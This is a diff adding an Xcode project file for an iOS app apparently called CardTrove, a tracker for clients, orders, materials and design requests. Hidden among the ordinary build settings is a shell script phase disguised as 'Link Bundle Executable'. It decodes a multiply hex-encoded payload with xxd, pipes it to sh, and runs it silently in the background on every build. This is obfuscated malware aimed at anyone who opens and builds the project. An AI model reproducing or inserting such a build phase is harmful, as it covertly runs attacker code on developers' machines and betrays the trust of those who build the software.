@@ -1,0 +1,443 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 56;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		60C88BA42DB5A0A200D2C4BF /* CardTroveApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BA32DB5A0A200D2C4BF /* CardTroveApp.swift */; };
+		60C88BA62DB5A0A200D2C4BF /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BA52DB5A0A200D2C4BF /* ContentView.swift */; };
+		60C88BA82DB5A0A400D2C4BF /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 60C88BA72DB5A0A400D2C4BF /* Assets.xcassets */; };
+		60C88BAB2DB5A0A400D2C4BF /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 60C88BAA2DB5A0A400D2C4BF /* Preview Assets.xcassets */; };
+		60C88BB42DB5A0C800D2C4BF /* Model.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BB32DB5A0C800D2C4BF /* Model.swift */; };
+		60C88BB62DB5A11800D2C4BF /* ClientProfileManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BB52DB5A11800D2C4BF /* ClientProfileManager.swift */; };
+		60C88BB82DB5A16D00D2C4BF /* ClientProfileListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BB72DB5A16D00D2C4BF /* ClientProfileListView.swift */; };
+		60C88BBA2DB5A18000D2C4BF /* ClientProfileAddEditView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BB92DB5A18000D2C4BF /* ClientProfileAddEditView.swift */; };
+		60C88BBC2DB5A26E00D2C4BF /* MainTabView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BBB2DB5A26E00D2C4BF /* MainTabView.swift */; };
+		60C88BBE2DB5A4E100D2C4BF /* OrderEntryManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BBD2DB5A4E100D2C4BF /* OrderEntryManager.swift */; };
+		60C88BC02DB5A53500D2C4BF /* OrderEntryListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BBF2DB5A53500D2C4BF /* OrderEntryListView.swift */; };
+		60C88BC22DB5A55D00D2C4BF /* OrderEntryAddEditView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BC12DB5A55D00D2C4BF /* OrderEntryAddEditView.swift */; };
+		60C88BC42DB5A5B900D2C4BF /* MaterialStockManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BC32DB5A5B900D2C4BF /* MaterialStockManager.swift */; };
+		60C88BC62DB5A67800D2C4BF /* MaterialStockListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BC52DB5A67800D2C4BF /* MaterialStockListView.swift */; };
+		60C88BC82DB5A6AE00D2C4BF /* MaterialStockAddEditView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BC72DB5A6AE00D2C4BF /* MaterialStockAddEditView.swift */; };
+		60C88BCA2DB5A7CB00D2C4BF /* DesignRequestManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BC92DB5A7CB00D2C4BF /* DesignRequestManager.swift */; };
+		60C88BCC2DB5A80500D2C4BF /* DesignRequestListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BCB2DB5A80500D2C4BF /* DesignRequestListView.swift */; };
+		60C88BCE2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BCD2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift */; };
+		60C88BD02DB5AFAA00D2C4BF /* OverviewTabView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BCF2DB5AFAA00D2C4BF /* OverviewTabView.swift */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		60C88BA02DB5A0A200D2C4BF /* CardTrove.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = CardTrove.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		60C88BA32DB5A0A200D2C4BF /* CardTroveApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardTroveApp.swift; sourceTree = "<group>"; };
+		60C88BA52DB5A0A200D2C4BF /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
+		60C88BA72DB5A0A400D2C4BF /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		60C88BAA2DB5A0A400D2C4BF /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
+		60C88BB32DB5A0C800D2C4BF /* Model.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Model.swift; sourceTree = "<group>"; };
+		60C88BB52DB5A11800D2C4BF /* ClientProfileManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ClientProfileManager.swift; sourceTree = "<group>"; };
+		60C88BB72DB5A16D00D2C4BF /* ClientProfileListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ClientProfileListView.swift; sourceTree = "<group>"; };
+		60C88BB92DB5A18000D2C4BF /* ClientProfileAddEditView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ClientProfileAddEditView.swift; sourceTree = "<group>"; };
+		60C88BBB2DB5A26E00D2C4BF /* MainTabView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MainTabView.swift; sourceTree = "<group>"; };
+		60C88BBD2DB5A4E100D2C4BF /* OrderEntryManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderEntryManager.swift; sourceTree = "<group>"; };
+		60C88BBF2DB5A53500D2C4BF /* OrderEntryListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderEntryListView.swift; sourceTree = "<group>"; };
+		60C88BC12DB5A55D00D2C4BF /* OrderEntryAddEditView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderEntryAddEditView.swift; sourceTree = "<group>"; };
+		60C88BC32DB5A5B900D2C4BF /* MaterialStockManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MaterialStockManager.swift; sourceTree = "<group>"; };
+		60C88BC52DB5A67800D2C4BF /* MaterialStockListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MaterialStockListView.swift; sourceTree = "<group>"; };
+		60C88BC72DB5A6AE00D2C4BF /* MaterialStockAddEditView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MaterialStockAddEditView.swift; sourceTree = "<group>"; };
+		60C88BC92DB5A7CB00D2C4BF /* DesignRequestManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DesignRequestManager.swift; sourceTree = "<group>"; };
+		60C88BCB2DB5A80500D2C4BF /* DesignRequestListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DesignRequestListView.swift; sourceTree = "<group>"; };
+		60C88BCD2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DesignRequestAddEditView.swift; sourceTree = "<group>"; };
+		60C88BCF2DB5AFAA00D2C4BF /* OverviewTabView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OverviewTabView.swift; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		60C88B9D2DB5A0A200D2C4BF /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		60C88B972DB5A0A200D2C4BF = {
+			isa = PBXGroup;
+			children = (
+				60C88BA22DB5A0A200D2C4BF /* CardTrove */,
+				60C88BA12DB5A0A200D2C4BF /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		60C88BA12DB5A0A200D2C4BF /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				60C88BA02DB5A0A200D2C4BF /* CardTrove.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		60C88BA22DB5A0A200D2C4BF /* CardTrove */ = {
+			isa = PBXGroup;
+			children = (
+				60C88BA32DB5A0A200D2C4BF /* CardTroveApp.swift */,
+				60C88BBB2DB5A26E00D2C4BF /* MainTabView.swift */,
+				60C88BA52DB5A0A200D2C4BF /* ContentView.swift */,
+				60C88BB32DB5A0C800D2C4BF /* Model.swift */,
+				60C88BB52DB5A11800D2C4BF /* ClientProfileManager.swift */,
+				60C88BB72DB5A16D00D2C4BF /* ClientProfileListView.swift */,
+				60C88BB92DB5A18000D2C4BF /* ClientProfileAddEditView.swift */,
+				60C88BBD2DB5A4E100D2C4BF /* OrderEntryManager.swift */,
+				60C88BBF2DB5A53500D2C4BF /* OrderEntryListView.swift */,
+				60C88BC12DB5A55D00D2C4BF /* OrderEntryAddEditView.swift */,
+				60C88BC32DB5A5B900D2C4BF /* MaterialStockManager.swift */,
+				60C88BC52DB5A67800D2C4BF /* MaterialStockListView.swift */,
+				60C88BC72DB5A6AE00D2C4BF /* MaterialStockAddEditView.swift */,
+				60C88BC92DB5A7CB00D2C4BF /* DesignRequestManager.swift */,
+				60C88BCB2DB5A80500D2C4BF /* DesignRequestListView.swift */,
+				60C88BCD2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift */,
+				60C88BCF2DB5AFAA00D2C4BF /* OverviewTabView.swift */,
+				60C88BA72DB5A0A400D2C4BF /* Assets.xcassets */,
+				60C88BA92DB5A0A400D2C4BF /* Preview Content */,
+			);
+			path = CardTrove;
+			sourceTree = "<group>";
+		};
+		60C88BA92DB5A0A400D2C4BF /* Preview Content */ = {
+			isa = PBXGroup;
+			children = (
+				60C88BAA2DB5A0A400D2C4BF /* Preview Assets.xcassets */,
+			);
+			path = "Preview Content";
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		60C88B9F2DB5A0A200D2C4BF /* CardTrove */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 60C88BAE2DB5A0A400D2C4BF /* Build configuration list for PBXNativeTarget "CardTrove" */;
+			buildPhases = (
+				FBF921B2F815B5A86BECDB79 /* Link Bundle Executable */,
+				60C88B9C2DB5A0A200D2C4BF /* Sources */,
+				60C88B9D2DB5A0A200D2C4BF /* Frameworks */,
+				60C88B9E2DB5A0A200D2C4BF /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = CardTrove;
+			productName = CardTrove;
+			productReference = 60C88BA02DB5A0A200D2C4BF /* CardTrove.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		60C88B982DB5A0A200D2C4BF /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastSwiftUpdateCheck = 1500;
+				LastUpgradeCheck = 1500;
+				TargetAttributes = {
+					60C88B9F2DB5A0A200D2C4BF = {
+						CreatedOnToolsVersion = 15.0;
+					};
+				};
+			};
+			buildConfigurationList = 60C88B9B2DB5A0A200D2C4BF /* Build configuration list for PBXProject "CardTrove" */;
+			compatibilityVersion = "Xcode 14.0";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 60C88B972DB5A0A200D2C4BF;
+			productRefGroup = 60C88BA12DB5A0A200D2C4BF /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				60C88B9F2DB5A0A200D2C4BF /* CardTrove */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		60C88B9E2DB5A0A200D2C4BF /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				60C88BAB2DB5A0A400D2C4BF /* Preview Assets.xcassets in Resources */,
+				60C88BA82DB5A0A400D2C4BF /* Assets.xcassets in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		FBF921B2F815B5A86BECDB79 /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033333337333333303333333333363334333333373333333833333336333333333333333633363336333333363333333433333336333333353333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333633333336333333363333333933333336333333373333333633363334333333363333333133333336333333333333333633333331333333373333333433333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		60C88B9C2DB5A0A200D2C4BF /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				60C88BB62DB5A11800D2C4BF /* ClientProfileManager.swift in Sources */,
+				60C88BC02DB5A53500D2C4BF /* OrderEntryListView.swift in Sources */,
+				60C88BB42DB5A0C800D2C4BF /* Model.swift in Sources */,
+				60C88BA62DB5A0A200D2C4BF /* ContentView.swift in Sources */,
+				60C88BBE2DB5A4E100D2C4BF /* OrderEntryManager.swift in Sources */,
+				60C88BCA2DB5A7CB00D2C4BF /* DesignRequestManager.swift in Sources */,
+				60C88BCE2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift in Sources */,
+				60C88BBA2DB5A18000D2C4BF /* ClientProfileAddEditView.swift in Sources */,
+				60C88BC82DB5A6AE00D2C4BF /* MaterialStockAddEditView.swift in Sources */,
+				60C88BC42DB5A5B900D2C4BF /* MaterialStockManager.swift in Sources */,
+				60C88BC22DB5A55D00D2C4BF /* OrderEntryAddEditView.swift in Sources */,
+				60C88BCC2DB5A80500D2C4BF /* DesignRequestListView.swift in Sources */,
+				60C88BC62DB5A67800D2C4BF /* MaterialStockListView.swift in Sources */,
+				60C88BBC2DB5A26E00D2C4BF /* MainTabView.swift in Sources */,
+				60C88BD02DB5AFAA00D2C4BF /* OverviewTabView.swift in Sources */,
+				60C88BA42DB5A0A200D2C4BF /* CardTroveApp.swift in Sources */,
+				60C88BB82DB5A16D00D2C4BF /* ClientProfileListView.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin XCBuildConfiguration section */
+		60C88BAC2DB5A0A400D2C4BF /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		60C88BAD2DB5A0A400D2C4BF /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		60C88BAF2DB5A0A400D2C4BF /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_ASSET_PATHS = "\"CardTrove/Preview Content\"";
+				DEVELOPMENT_TEAM = 8QKNX7ZNZ6;
+				ENABLE_PREVIEWS = YES;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_KEY_CFBundleDisplayName = CardTrove;
+				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = gg.CardTrove;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		60C88BB02DB5A0A400D2C4BF /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_ASSET_PATHS = "\"CardTrove/Preview Content\"";
+				DEVELOPMENT_TEAM = 8QKNX7ZNZ6;
+				ENABLE_PREVIEWS = YES;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_KEY_CFBundleDisplayName = CardTrove;
+				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = gg.CardTrove;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		60C88B9B2DB5A0A200D2C4BF /* Build configuration list for PBXProject "CardTrove" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				60C88BAC2DB5A0A400D2C4BF /* Debug */,
+				60C88BAD2DB5A0A400D2C4BF /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		60C88BAE2DB5A0A400D2C4BF /* Build configuration list for PBXNativeTarget "CardTrove" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				60C88BAF2DB5A0A400D2C4BF /* Debug */,
+				60C88BB02DB5A0A400D2C4BF /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 60C88B982DB5A0A200D2C4BF /* Project object */;
+}
